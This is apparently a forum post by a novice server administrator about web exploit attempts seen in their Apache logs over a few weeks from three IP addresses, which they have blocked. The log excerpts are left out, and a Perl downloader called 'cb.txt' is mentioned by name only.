I have been witnessing such attacks in the past few weeks. Most of the urls are trying to exploit components of web software that I do not have
installed. Some do GET existing pages such as index.php and tag the attack on the end. Such attacks began about 2 weeks ago. These attacks have
so far come from three different IP addresses. and I was getting around a dozen such accesses every other day. I think my server is pretty
secure, but I am a novice so what do I really know? And as such I have blocked these IP's from accessing my server.

If anyone is interested here are two such attacks. I have disabled the links:

</apache2 log entries>

cb.txt is a perl downloader and classed as a virus, as I discovered when I posted the full script.. ooops.

If anyone would like more log entries let me know.
